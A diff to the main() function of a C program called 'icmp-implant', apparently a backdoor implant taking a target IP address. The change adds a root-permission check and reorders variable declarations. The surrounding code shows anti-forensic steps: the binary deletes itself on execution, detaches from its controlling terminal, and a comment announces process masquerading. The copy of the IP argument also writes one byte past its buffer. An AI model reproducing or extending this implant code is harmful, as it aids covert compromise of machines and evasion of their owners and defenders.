@@ -9,14 +9,20 @@
 #include "../include/implant.h"
 
 int main(int argc, char **argv, char **envp) {
+    const void *empty = NULL;
+    size_t ip_len;
+
     if (argc < 2) {
         fprintf(stderr, "Usage: ./icmp-implant [IP-ADDRESS]\n");
         return 1;
+    } else {
+        ip_len = strlen(argv[1]);
     }
 
-    const void *empty = NULL;
-    size_t ip_len = strlen(argv[1]);
-    char target[ip_len];
+    if (geteuid() != 0) {
+        fprintf(stderr, "root permission is required to run the binary.\n");
+        return 1;
+    }
 
     // remove implant upon execution
     unlink(argv[0]);
@@ -25,6 +31,7 @@ int main(int argc, char **argv, char **envp) {
     ioctl(0, TIOCNOTTY);
 
     // save the arg for later
+    char target[ip_len];
     strncpy(target, argv[1], ip_len + 1);
 
     // process masquerading, change the command name associated with the process
